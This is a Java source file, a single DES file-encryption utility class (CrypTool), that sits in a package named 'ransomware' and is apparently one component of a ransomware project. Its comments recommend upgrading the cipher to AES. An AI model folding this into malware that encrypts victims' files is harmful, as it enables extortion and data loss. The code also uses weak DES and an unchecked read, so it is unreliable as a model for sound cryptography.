/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.io.FilenameFilter;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Scanner;
import java.util.List;
import javax.crypto.BadPaddingException;



public class CrypTool {
    private static final String ALGORITHM = "DES"; // change it to AES and use enough bits codeKey
    
    private static final String TRANSFORMATION= "DES";  // change it to AES and use enough bits codeKey
    
    public static void encrypt(String key, File inputFile, File outputFile)
            throws CryptoException, NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        
      //  System.out.println("encrypt working!!");
     //   System.out.println(inputFile);
      //  System.out.println(outputFile);
        
        doCrypto(Cipher.ENCRYPT_MODE, key, inputFile, outputFile);
  
            }
    public static void decrypt(String key, File inputFile, File outputFile)
             throws CryptoException, NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);
    }
    private static void doCrypto(int cipherMode, String key, File inputFile, File outputFile)
            throws CryptoException, NoSuchAlgorithmException, FileNotFoundException, IOException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
            
      //  System.out.println("doCrypto WOrking");
            Key secretKey= new SecretKeySpec(key.getBytes(), ALGORITHM);
            Cipher cipher=Cipher.getInstance(TRANSFORMATION);
            
            cipher.init(cipherMode, secretKey);
            
            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes= new byte[(int) inputFile.length()];
            inputStream.read(inputBytes);
             
            byte[] outputBytes=cipher.doFinal(inputBytes);
            FileOutputStream outputStream=new FileOutputStream(outputFile);
            outputStream.write(outputBytes);
            
            inputStream.close();
            outputStream.close();        
    
    }
}

        